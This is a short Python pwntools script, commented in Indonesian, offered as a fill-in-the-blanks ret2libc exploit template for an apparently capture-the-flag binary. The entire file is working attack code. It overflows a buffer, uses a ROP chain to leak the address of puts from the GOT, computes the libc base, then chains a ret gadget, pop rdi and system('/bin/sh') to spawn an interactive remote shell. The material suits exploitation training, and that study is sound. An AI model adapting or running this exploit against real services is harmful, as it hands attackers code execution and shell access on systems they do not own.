#!/usr/bin/env python3
# Template ret2libc (leak -> system("/bin/sh")). Isi OFFSET, prompt, HOST/PORT, libc.
from pwn import *

BIN  = './chall'
context.binary = exe = ELF(BIN, checksec=False)
libc = ELF('./libc.so.6', checksec=False)   # ganti libc yang bener (libc.rip / libc-database)
HOST, PORT = 'host', 1337
OFFSET = 40
PROMPT = b'> '

def start():
    return remote(HOST, PORT) if args.REMOTE else process(BIN)

io = start()
rop = ROP(exe)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET     = rop.find_gadget(['ret'])[0]

# ---- Tahap 1: leak alamat libc via puts(puts@got), balik ke main ----
payload  = b'A'*OFFSET
payload += p64(POP_RDI) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
io.sendlineafter(PROMPT, payload)

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# ---- Tahap 2: system("/bin/sh") ----
binsh = next(libc.search(b'/bin/sh\x00'))
payload  = b'A'*OFFSET
payload += p64(RET)                     # alignment
payload += p64(POP_RDI) + p64(binsh)
payload += p64(libc.sym['system'])
io.sendlineafter(PROMPT, payload)

io.interactive()
